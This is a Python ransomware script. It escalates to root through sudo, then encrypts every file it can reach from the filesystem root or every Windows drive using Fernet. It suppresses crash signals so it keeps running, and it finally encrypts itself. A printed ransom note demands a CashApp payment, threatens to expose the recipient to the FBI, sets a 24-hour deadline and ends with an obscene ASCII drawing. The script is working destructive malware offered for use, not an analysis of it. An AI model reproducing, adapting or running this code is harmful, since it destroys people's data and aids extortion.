#!/usr/bin/env python3

import os
import sys
import subprocess
import platform
import logging
import signal
import time
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

# Setup logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.StreamHandler()
                    ])

# Function to check and relaunch with elevated permissions
def check_and_relaunch():
    if platform.system() == "Linux" and os.geteuid() != 0:
        logging.info("Script is not running as root. Re-launching with sudo...")
        try:
            subprocess.run(['sudo', 'python3'] + sys.argv)
            sys.exit(0)
        except Exception as e:
            logging.error(f"Failed to relaunch script with sudo: {e}")
            sys.exit(1)
    elif platform.system() == "Windows":
        logging.info("Script is not running with administrative privileges. Please run as an administrator.")
        sys.exit(1)

check_and_relaunch()

# Generate encryption key
key = Fernet.generate_key()
with open("thekey.key", "wb") as key_file:
    key_file.write(key)

# Exclude specific files and directories
EXCLUDE_FILES = {"main.py", "thekey.key", "decrypt.py"}
EXCLUDE_DIRS = {os.path.abspath(os.path.dirname(sys.executable)), os.path.abspath(os.path.dirname(__file__))}

# Add the virtual environment directory to the exclusion list
if 'VIRTUAL_ENV' in os.environ:
    EXCLUDE_DIRS.add(os.environ['VIRTUAL_ENV'])

# Function to encrypt a file
def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        logging.info(f"Encrypted {file_path}")
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")

# Function to get all files from a root directory
def get_all_files(root_dir, exclude_paths):
    for root, _, files in os.walk(root_dir):
        if any(os.path.commonpath([root, exclude]) == exclude for exclude in exclude_paths):
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.basename(file_path) not in EXCLUDE_FILES:
                yield file_path

# Function to process files in chunks
def process_files_in_chunks(files, chunk_size=10):
    while True:
        chunk = []
        try:
            for _ in range(chunk_size):
                chunk.append(next(files))
        except StopIteration:
            if chunk:
                yield chunk
            break
        yield chunk

# Signal handler for bus errors and segmentation faults
def bus_error_handler(signum, frame):
    logging.error("Bus error (signal %d). Continuing..." % signum)
    time.sleep(1)

def segfault_handler(signum, frame):
    logging.error("Segmentation fault (signal %d). Continuing..." % signum)
    time.sleep(1)

signal.signal(signal.SIGBUS, bus_error_handler)
signal.signal(signal.SIGSEGV, segfault_handler)

# Encrypt files in chunks
def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
    all_files = get_all_files(root_dir, exclude_paths)
    for chunk in process_files_in_chunks(all_files, chunk_size):
        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(encrypt_file, file) for file in chunk]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error processing a file: {e}")

# Main function
def main():
    root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
    exclude_paths = EXCLUDE_DIRS

    for root_dir in root_dirs:
        encrypt_files_in_chunks(root_dir, exclude_paths)

    # Finally encrypt the current script
    for script in EXCLUDE_FILES:
        script_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), script)
        if os.path.exists(script_path):
            encrypt_file(script_path)

if __name__ == "__main__":
    main()








    print("\nDidnt your mom ever tell you to not scam innocent people?\n")
    print("Many of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written for the fraudulent check you sent me via email ($7,425.79 USD)")
    print("not only are your files encrypted I also have information on who you are and your real location despite your efforts to hide them")
    print("if you fail to do so I will hand everything over to the FBI including your real identity and location which will then be given to the proper authorities to reach you.")
    print("you have 24 hours to respond")
    print("you will respond via the same email thread you sent the counterfit check")
    print("failure to respond as instructed will result in irreversible system corruption")
    bird = """

    ░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ██████▄███▄████░░███▄░░░░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
    ▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
    █████▀░░░░▀▀████████░░░░░░


    """
    print(bird)

    